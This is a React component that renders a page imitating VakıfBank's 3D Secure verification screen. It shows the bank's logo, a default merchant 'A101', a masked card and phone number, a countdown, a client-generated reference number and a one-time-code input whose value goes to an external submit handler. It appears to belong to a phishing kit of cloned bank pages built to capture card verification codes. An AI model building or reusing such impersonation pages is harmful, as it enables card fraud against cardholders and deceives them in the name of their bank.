'use client';

import { useState } from 'react';
import { FiEye, FiEyeOff } from 'react-icons/fi';
import CardSchemeBadge from '@/components/CardSchemeBadge';
import BankLogo from '@/components/banks/logos/BankLogo';
import ThreeDSecureShell from './ThreeDSecureShell';
import {
  formatAmount,
  maskCardVakifbank,
  maskPhoneVakifbank,
  referenceNo,
} from './threeDSecureUtils';
import { useCountdownTimer } from './useCountdownTimer';
import { useClientMountValue } from './useClientMountValue';
import type { BankThreeDSecureProps } from './types';

export default function VakifbankThreeDSecurePage({
  amount,
  cardNumber,
  phoneNumber,
  verificationCode,
  onVerificationCodeChange,
  error,
  loading,
  transactionDate,
  merchantName = 'A101',
  onSubmit,
  onCancel,
}: BankThreeDSecureProps) {
  const formattedAmount = formatAmount(amount);
  const { mmss } = useCountdownTimer(170);
  const [showCode, setShowCode] = useState(false);
  const refNo = useClientMountValue(referenceNo, '000000000');

  const rows = [
    { label: 'İşyeri Adı', value: merchantName.toUpperCase() },
    { label: 'İşlem Tutarı', value: `${formattedAmount} TL`, bold: true },
    { label: 'İşlem Tarihi - Saat', value: transactionDate },
    { label: 'Kart Numarası', value: maskCardVakifbank(cardNumber) },
    { label: 'Referans No', value: refNo },
  ];

  return (
    <ThreeDSecureShell onClose={onCancel}>
      <div className="px-4 pb-5 pt-4">
        <div className="mb-3 flex items-center justify-between">
          <BankLogo bankId="vakifbank" height={30} />
          <CardSchemeBadge cardNumber={cardNumber} compact />
        </div>

        <div className="mb-4 bg-[#ff9800] py-2 text-center text-sm font-bold tracking-wide text-white">
          3D SECURE DOĞRULAMA
        </div>

        <div className="mb-4 border border-gray-200 border-l-4 border-l-[#ffb300]">
          {rows.map((row) => (
            <div
              key={row.label}
              className="flex justify-between gap-3 border-b border-gray-100 px-3 py-2 text-[13px] last:border-b-0"
            >
              <span className="text-gray-600">{row.label}</span>
              <span className={`text-right text-gray-900 ${row.bold ? 'font-bold' : 'font-semibold'}`}>
                {row.value}
              </span>
            </div>
          ))}
        </div>

        <p className="mb-4 text-center text-[13px] leading-relaxed text-gray-800">
          Doğrulama kodu, <span className="font-semibold">{maskPhoneVakifbank(phoneNumber)}</span> nolu cep
          telefonunuza gönderilmiştir.
        </p>

        {error && (
          <div className="mb-3 rounded border border-red-200 bg-red-50 px-3 py-2 text-center text-xs text-red-600">
            {error}
          </div>
        )}

        <form onSubmit={onSubmit}>
          <p className="mb-2 text-center text-sm font-semibold text-gray-800">Doğrulama Kodu</p>

          <div className="relative mb-3">
            <input
              type={showCode ? 'text' : 'password'}
              inputMode="numeric"
              autoComplete="one-time-code"
              value={verificationCode}
              onChange={(e) => onVerificationCodeChange(e.target.value.replace(/\D/g, '').slice(0, 6))}
              maxLength={6}
              className="w-full rounded-lg border border-gray-300 py-3 pl-4 pr-12 text-center text-lg tracking-widest outline-none focus:border-[#ff9800]"
            />
            <button
              type="button"
              onClick={() => setShowCode((v) => !v)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#ff9800]"
              aria-label={showCode ? 'Kodu gizle' : 'Kodu göster'}
            >
              {showCode ? <FiEyeOff size={18} /> : <FiEye size={18} />}
            </button>
          </div>

          <p className="mb-4 text-center text-sm text-gray-700">
            Kalan Süre: <span className="font-bold">{mmss}</span>
          </p>

          <button
            type="submit"
            disabled={loading || verificationCode.length < 4}
            className="mb-3 w-full rounded bg-[#bdbdbd] py-3 text-sm font-bold text-white disabled:opacity-60"
          >
            {loading ? 'Gönderiliyor...' : 'Onayla'}
          </button>

          <div className="mb-4 flex justify-between text-sm text-gray-600">
            <button type="button" onClick={onCancel} className="hover:underline">
              İşlemi İptal Et
            </button>
            <button type="button" className="hover:underline">
              Yardım
            </button>
          </div>

          <button type="button" className="w-full text-center text-sm font-bold text-gray-800 underline">
            Diğer Doğrulama Yöntemleri ile Devam Et
          </button>
        </form>
      </div>
    </ThreeDSecureShell>
  );
}
